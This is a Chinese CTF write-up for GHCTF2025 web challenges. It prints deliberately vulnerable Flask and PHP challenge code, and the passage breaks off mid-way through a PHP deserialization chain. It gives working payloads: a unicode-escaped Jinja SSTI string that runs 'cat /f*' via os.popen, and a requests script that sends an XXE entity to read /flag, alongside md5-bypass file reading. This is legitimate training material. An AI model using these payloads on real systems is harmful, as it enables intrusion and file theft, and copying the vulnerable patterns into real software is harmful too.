---
layout: post
title: "GHCTF2025-Web"
date: 2025-03-09 22:04:49 +0800
description: "替换为空, 使用了bottle库, 查找一些资料, 发现存在ssti模板注入, 本地搭建环境, 把waf去掉, 可以发现使用。前面一直卡在这, 没办法执行一些函数操作啥的, 就没管了, 后面wp出来之后才知道这是Sqlite注⼊ , 怪我见识短浅了。有点奇怪, 我自己本地试了一下这个cookie是可以被反序列化然后执行的, 但是靶机上一直没成功,可能没有权限还是干嘛。可以执行代码, 但是题目是没有回显的, 所以需要反弹shell, 连上自己的vps。php反序列化, 看似代码很多, 其实大都是没有用的。"
keywords: "GHCTF2025--Web"
categories: ['未分类']
tags: ['Writeup', 'Web', 'Ghctf', 'Ctf']
artid: "145965495"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=145965495
    alt: "GHCTF2025-Web"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=145965495
featuredImagePreview: https://bing.ee123.net/img/rand?artid=145965495
cover: https://bing.ee123.net/img/rand?artid=145965495
image: https://bing.ee123.net/img/rand?artid=145965495
img: https://bing.ee123.net/img/rand?artid=145965495
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     GHCTF2025--Web
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-tomorrow-night" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h3>
     <a id="uploadSSTI_0">
     </a>
     upload?SSTI!
    </h3>
    <pre><code class="prism language-php">import os
import re

from flask import Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span>render_template_string<span class="token punctuation">,</span>send_from_directory<span class="token punctuation">,</span> abort<span class="token punctuation">,</span>redirect
from werkzeug<span class="token operator">.</span>utils import secure_filename
import os
from werkzeug<span class="token operator">.</span>utils import secure_filename

app <span class="token operator">=</span> <span class="token function">Flask</span><span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token comment"># 配置信息</span>
<span class="token constant">UPLOAD_FOLDER</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'static/uploads'</span>  <span class="token comment"># 上传文件保存目录</span>
<span class="token constant">ALLOWED_EXTENSIONS</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'text'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'md'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">}</span>
<span class="token constant">MAX_CONTENT_LENGTH</span> <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>  <span class="token comment"># 限制上传大小为 16MB</span>

app<span class="token operator">.</span>config<span class="token punctuation">[</span><span class="token string single-quoted-string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_FOLDER</span>
app<span class="token operator">.</span>config<span class="token punctuation">[</span><span class="token string single-quoted-string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">MAX_CONTENT_LENGTH</span>

<span class="token comment"># 创建上传目录（如果不存在）</span>
os<span class="token operator">.</span><span class="token function">makedirs</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_FOLDER</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token constant boolean">True</span><span class="token punctuation">)</span>
def <span class="token function">is_safe_path</span><span class="token punctuation">(</span>basedir<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> os<span class="token operator">.</span>path<span class="token operator">.</span><span class="token function">commonpath</span><span class="token punctuation">(</span><span class="token punctuation">[</span>basedir<span class="token punctuation">,</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span>


def <span class="token function">contains_dangerous_keywords</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token class-name return-type">dangerous_keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'os'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__globals__'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token punctuation">]</span>

    with <span class="token function">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string single-quoted-string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        file_content <span class="token operator">=</span> <span class="token function">str</span><span class="token punctuation">(</span>f<span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


        <span class="token keyword">for</span> keyword in dangerous_keywords<span class="token punctuation">:</span>
            <span class="token keyword">if</span> keyword in file_content<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token constant boolean">True</span>  <span class="token comment"># 找到危险关键字，返回 True</span>

    <span class="token keyword">return</span> <span class="token constant boolean">False</span>  <span class="token comment"># 文件内容中没有危险关键字</span>
def <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string single-quoted-string">'.'</span> in filename <span class="token keyword">and</span> \
        filename<span class="token operator">.</span><span class="token function">rsplit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span> in <span class="token constant">ALLOWED_EXTENSIONS</span>


@app<span class="token operator">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
def <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token operator">.</span>method <span class="token operator">==</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">:</span>
        <span class="token comment"># 检查是否有文件被上传</span>
        <span class="token keyword">if</span> <span class="token string single-quoted-string">'file'</span> not in request<span class="token operator">.</span>files<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token function">jsonify</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"未上传文件"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>

        file <span class="token operator">=</span> request<span class="token operator">.</span>files<span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span>

        <span class="token comment"># 检查是否选择了文件</span>
        <span class="token keyword">if</span> file<span class="token operator">.</span>filename <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token function">jsonify</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"请选择文件"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>

        <span class="token comment"># 验证文件名和扩展名</span>
        <span class="token keyword">if</span> file <span class="token keyword">and</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>file<span class="token operator">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># 安全处理文件名</span>
            filename <span class="token operator">=</span> <span class="token function">secure_filename</span><span class="token punctuation">(</span>file<span class="token operator">.</span>filename<span class="token punctuation">)</span>
            <span class="token comment"># 保存文件</span>
            save_path <span class="token operator">=</span> os<span class="token operator">.</span>path<span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span>app<span class="token operator">.</span>config<span class="token punctuation">[</span><span class="token string single-quoted-string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
            file<span class="token operator">.</span><span class="token function">save</span><span class="token punctuation">(</span>save_path<span class="token punctuation">)</span>



            <span class="token comment"># 返回文件路径（绝对路径）</span>
            <span class="token keyword">return</span> <span class="token function">jsonify</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
                <span class="token string double-quoted-string">"message"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"File uploaded successfully"</span><span class="token punctuation">,</span>
                <span class="token string double-quoted-string">"path"</span><span class="token punctuation">:</span> os<span class="token operator">.</span>path<span class="token operator">.</span><span class="token function">abspath</span><span class="token punctuation">(</span>save_path<span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token function">jsonify</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"文件类型错误"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>

    <span class="token comment"># GET 请求显示上传表单（可选）</span>
    <span class="token keyword">return</span> <span class="token string single-quoted-string">''</span><span class="token string single-quoted-string">'
    &lt;!doctype html&gt;
    &lt;title&gt;Upload File&lt;/title&gt;
    &lt;h1&gt;Upload File&lt;/h1&gt;
    &lt;form method=post enctype=multipart/form-data&gt;
      &lt;input type=file name=file&gt;
      &lt;input type=submit value=Upload&gt;
    &lt;/form&gt;
    '</span><span class="token string single-quoted-string">''</span>

@app<span class="token operator">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file/&lt;path:filename&gt;'</span><span class="token punctuation">)</span>
def <span class="token function">view_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># 1. 过滤文件名</span>
        safe_filename <span class="token operator">=</span> <span class="token function">secure_filename</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        <span class="token keyword">if</span> not safe_filename<span class="token punctuation">:</span>
            <span class="token function">abort</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string double-quoted-string">"无效文件名"</span><span class="token punctuation">)</span>

        <span class="token comment"># 2. 构造完整路径</span>
        file_path <span class="token operator">=</span> os<span class="token operator">.</span>path<span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span>app<span class="token operator">.</span>config<span class="token punctuation">[</span><span class="token string single-quoted-string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> safe_filename<span class="token punctuation">)</span>

        <span class="token comment"># 3. 路径安全检查</span>
        <span class="token keyword">if</span> not <span class="token function">is_safe_path</span><span class="token punctuation">(</span>app<span class="token operator">.</span>config<span class="token punctuation">[</span><span class="token string single-quoted-string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token class-name return-type">abort</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string double-quoted-string">"禁止访问的路径"</span><span class="token punctuation">)</span>

        <span class="token comment"># 4. 检查文件是否存在</span>
        <span class="token keyword">if</span> not os<span class="token operator">.</span>path<span class="token operator">.</span><span class="token function">isfile</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token class-name return-type">abort</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string double-quoted-string">"文件不存在"</span><span class="token punctuation">)</span>

        suffix<span class="token operator">=</span>os<span class="token operator">.</span>path<span class="token operator">.</span><span class="token function">splitext</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>suffix<span class="token punctuation">)</span>
        <span class="token keyword">if</span> suffix<span class="token operator">==</span><span class="token string double-quoted-string">".jpg"</span> <span class="token keyword">or</span> suffix<span class="token operator">==</span><span class="token string double-quoted-string">".png"</span> <span class="token keyword">or</span> suffix<span class="token operator">==</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token function">send_from_directory</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"static/uploads/"</span><span class="token punctuation">,</span>filename<span class="token punctuation">,</span>mimetype<span class="token operator">=</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token function">contains_dangerous_keywords</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># 删除不安全的文件</span>
            os<span class="token operator">.</span><span class="token function">remove</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token function">jsonify</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"Waf!!!!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>

        with <span class="token function">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string single-quoted-string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            file_data <span class="token operator">=</span> f<span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span>
        tmp_str <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token string double-quoted-string">"&lt;!DOCTYPE html&gt;
        &lt;html lang="</span>zh<span class="token string double-quoted-string">"&gt;
        &lt;head&gt;
            &lt;meta charset="</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span><span class="token string double-quoted-string">"&gt;
            &lt;meta name="</span>viewport<span class="token string double-quoted-string">" content="</span>width<span class="token operator">=</span>device<span class="token operator">-</span>width<span class="token punctuation">,</span> initial<span class="token operator">-</span>scale<span class="token operator">=</span><span class="token number">1.0</span><span class="token string double-quoted-string">"&gt;
            &lt;title&gt;查看文件内容&lt;/title&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;h1&gt;文件内容：{name}&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;
            &lt;pre&gt;{data}&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;

            &lt;footer&gt;
                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;
            &lt;/footer&gt;
        &lt;/body&gt;
        &lt;/html&gt;
        "</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span><span class="token function">format</span><span class="token punctuation">(</span>name<span class="token operator">=</span>safe_filename<span class="token punctuation">,</span> data<span class="token operator">=</span>file_data<span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token function">render_template_string</span><span class="token punctuation">(</span>tmp_str<span class="token punctuation">)</span>

    except Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        app<span class="token operator">.</span>logger<span class="token operator">.</span><span class="token function">error</span><span class="token punctuation">(</span>f<span class="token string double-quoted-string">"文件查看失败: {str(e)}"</span><span class="token punctuation">)</span>
        <span class="token function">abort</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string double-quoted-string">"文件查看失败:{} "</span><span class="token operator">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token function">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment"># 错误处理（可选）</span>
@app<span class="token operator">.</span><span class="token function">errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
def <span class="token function">not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">:</span> error<span class="token operator">.</span>description<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">404</span>


@app<span class="token operator">.</span><span class="token function">errorhandler</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>
def <span class="token function">forbidden</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">:</span> error<span class="token operator">.</span>description<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">403</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string single-quoted-string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token operator">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0.0.0.0"</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token constant boolean">False</span><span class="token punctuation">)</span>

</code></pre>
    <p>
     很明显的ssti, 过滤的内容也不多
     <br/>
     直接编码绕就行
     <br/>
     payload:
    </p>
    <pre><code>{<!-- -->{lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u0067\u0065\u0074")("\u006f\u0073")|attr("\u0070\u006f\u0070\u0065\u006e")("cat /f*")|attr("\u0072\u0065\u0061\u0064")()}}
</code></pre>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/4f18763b5930498b82e552522990090d.png">
      <br/>
      直接访问
      <code>
       /file/1.txt
      </code>
      就行
      <br/>
      <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/d3435e906d434d56968fb966dae275b0.png"/>
     </img>
    </p>
    <h3>
     <a id="_168">
     </a>
     (&gt;﹏&lt;)
    </h3>
    <p>
     直接给了源码
    </p>
    <pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
<span class="token keyword">import</span> re

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ghctf'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    xml <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'xml'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span>
    <span class="token keyword">if</span> xml <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No System is Safe."</span>
    parser <span class="token operator">=</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>load_dtd<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    root <span class="token operator">=</span> etree<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>xml<span class="token punctuation">,</span> parser<span class="token punctuation">)</span>
    name <span class="token operator">=</span> root<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token keyword">return</span> name <span class="token keyword">or</span> <span class="token boolean">None</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span>

</code></pre>
    <p>
     <code>
      parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
     </code>
     <br/>
     load_dtd=True: 允许解析器加载并处理 XML 文档中的 DTD
     <br/>
     resolve_entities=True: 启用实体解析功能，包括外部实体
    </p>
    <p>
     很明显的打xxe, 而且也没有什么过滤
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> requests

url<span class="token operator">=</span><span class="token string">"http://node2.anna.nssctf.cn:28836/ghctf"</span>
payload<span class="token operator">=</span><span class="token triple-quoted-string string">"""&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///flag"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;"""</span>

data<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"xml"</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/c35c1eb496cd4757b8f67fd59a0fb556.png"/>
    </p>
    <h3>
     <a id="ez_readfile_237">
     </a>
     ez_readfile
    </h3>
    <p>
     代码很简单
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <p>
     基础的md5绕过, 然后就是
     <code>
      file_get_contents
     </code>
     读文件
     <br/>
     但是读了
     <code>
      /flag
     </code>
     没有反应, 应该是改了文件名
     <br/>
     首先开始想的是PHP Base64 Filter宽松解析特性和iconv filter编码转换构造命令执行
     <br/>
     但是好像没有用, 根本没办法去执行
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/035bbcf180b34a17b07c864a607b7a57.png">
      <br/>
      然后想的是利用
      <code>
       CVE-2024-2961
      </code>
      从读文件到rce, 但也是一直没成功, 有点不理解
     </img>
    </p>
    <p>
     后面就想读一下环境变量,
     <code>
      /proc/self/environ
     </code>
     , 但是权限不足
     <br/>
     就一直想找有没有什么文件能指定flag文件的名字
     <br/>
     后面就找到了
     <code>
      /docker-entrypoint.sh
     </code>
     这个文件
     <br/>
     发现里面有flag的文件名 (真是离谱的长)
     <br/>
     直接读它拿到flag
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/ce9c45c5af0249238811307f503a2dd0.png"/>
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/d037a199b0604564a4545353c8de8dde.png"/>
    </p>
    <h3>
     <a id="Popppppp_273">
     </a>
     Popppppp
    </h3>
    <p>
     php反序列化, 看似代码很多, 其实大都是没有用的
     <br/>
     一些分析的过程写在注释里面了
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token punctuation">;</span> <span class="token comment">//找toString,有三个类存在这个方法 CherryBlossom, UselessTwo, Samurai</span>
                            <span class="token comment">//1.1 $fruit1=new CherryBlossom    </span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$newFunc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$newFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//找__invoke, 1.2 $fruit2= new Philosopher</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Forbidden</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$fruit3</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit3</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

